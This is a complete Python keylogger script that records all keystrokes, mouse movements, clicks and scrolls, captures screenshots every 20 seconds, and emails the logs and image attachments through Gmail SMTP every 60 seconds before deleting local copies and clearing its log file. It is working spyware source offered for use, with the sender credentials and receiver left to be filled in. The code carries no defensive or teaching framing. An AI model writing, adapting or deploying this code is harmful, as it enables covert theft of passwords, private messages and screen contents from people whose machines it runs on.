import logging
import smtplib
import threading
import os
import shutil
from datetime import datetime
import pyscreenshot
from pynput import keyboard
from pynput.mouse import Listener, Button
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Configure logging
logging.basicConfig(filename='keylogger.log', level=logging.INFO, format='%(asctime)s: %(message)s')

EMAIL_ADDRESS = ""  # The email address to send reports from
EMAIL_PASSWORD = "" # The password for the email account
SEND_EMAIL_EVERY = 60
SEND_SCREENSHOT_EVERY = 20

class KeyLogger:
    def __init__(self, email_interval, screenshot_interval, email, password):
        self.email_interval = email_interval
        self.screenshot_interval = screenshot_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password
        self.timer_email = None
        self.timer_screenshot = None
        self.running = True

        self.screenshot_folder = "screenshots"
        if not os.path.exists(self.screenshot_folder):
            os.makedirs(self.screenshot_folder)

    def append_log(self, string):
        self.log += string + "\n"

    def on_move(self, x, y):
        current_move = f"Mouse moved to {x}, {y}"
        logging.info(current_move)
        self.append_log(current_move)

    def on_click(self, x, y, button, pressed):
        current_click = f"Mouse {'pressed' if pressed else 'released'} at {x}, {y}"
        logging.info(current_click)
        self.append_log(current_click)

        if button == Button.left:
            self.append_log("Left mouse button clicked")
        elif button == Button.right:
            self.append_log("Right mouse button clicked")

    def on_scroll(self, x, y, dx, dy):
        current_scroll = f"Mouse scrolled at {x}, {y}"
        logging.info(current_scroll)
        self.append_log(current_scroll)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = " SPACE "
            elif key == keyboard.Key.enter:
                current_key = " ENTER "
            elif key == keyboard.Key.esc:
                current_key = " ESC "
            else:
                current_key = " " + str(key) + " "
        self.append_log(current_key)

    def send_mail(self, email, password, message):
        sender = f"Private Person <{email}>"
        receiver = "" # Set the receiver's email

        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = receiver
        msg['Subject'] = "Keylogger Report"

        msg.attach(MIMEText(message, 'plain'))

        screenshot_paths = []
        for screenshot in os.listdir(self.screenshot_folder):
            screenshot_path = os.path.join(self.screenshot_folder, screenshot)
            with open(screenshot_path, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition", f"attachment; filename= {screenshot}")
                msg.attach(part)
                screenshot_paths.append(screenshot_path)

        try:
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()
                server.login(email, password)
                server.send_message(msg)
            logging.info("Email sent successfully!")

            for screenshot_path in screenshot_paths:
                os.remove(screenshot_path)
                logging.info(f"Deleted screenshot: {screenshot_path}")

            self.clear_local_log()

        except Exception as e:
            logging.error(f"Failed to send email: {e}")
            with open("keylogger_log.txt", "a") as f:
                f.write("\n\n" + message)

    def clear_local_log(self):
        log_file = 'keylogger.log'
        if os.path.exists(log_file):
            try:
                open(log_file, 'w').close()
                logging.info(f"{log_file} cleared.")
            except Exception as e:
                logging.error(f"Error clearing log file {log_file}: {e}")

    def clear_screenshots(self):
        if os.path.exists(self.screenshot_folder):
            logging.info(f"Deleting {self.screenshot_folder} folder and contents.")
            try:
                shutil.rmtree(self.screenshot_folder)
                logging.info("Screenshots folder deleted.")
            except Exception as e:
                logging.error(f"Error deleting screenshots folder: {e}")

    def clear_log(self):
        log_file = 'keylogger.log'
        if os.path.exists(log_file):
            try:
                logging.shutdown()
                os.remove(log_file)
            except Exception as e:
                logging.error(f"Error deleting log file {log_file}: {e}")

    def stop_timers(self):
        if self.timer_email is not None:
            self.timer_email.cancel()
            self.timer_email.join()
        if self.timer_screenshot is not None:
            self.timer_screenshot.cancel()
            self.timer_screenshot.join()

    def report(self):
        if self.log:
            self.send_mail(self.email, self.password, "\n\n" + self.log)
            self.log = ""
        self.timer_email = threading.Timer(self.email_interval, self.report)
        self.timer_email.start()

    def screenshot(self):
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        filename = os.path.join(self.screenshot_folder, f'screenshot_{timestamp}.png')
        img = pyscreenshot.grab()
        img.save(filename)
        self.append_log(f"Screenshot saved as {filename}")
        logging.info(f"Screenshot taken successfully: {filename}.")

        self.timer_screenshot = threading.Timer(self.screenshot_interval, self.screenshot)
        self.timer_screenshot.start()

    def run(self):
        try:
            self.report()
            self.screenshot()

            keyboard_listener = keyboard.Listener(on_press=self.save_data)
            with keyboard_listener:
                with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                    while self.running:
                        pass
        except KeyboardInterrupt:
            self.stop_timers()
            self.cleanup()

    def cleanup(self):
        self.clear_screenshots()
        self.clear_log()
        self.running = False

# Initialize and run the keylogger
keylogger = KeyLogger(SEND_EMAIL_EVERY, SEND_SCREENSHOT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)

# Start the keylogger
keylogger.run()
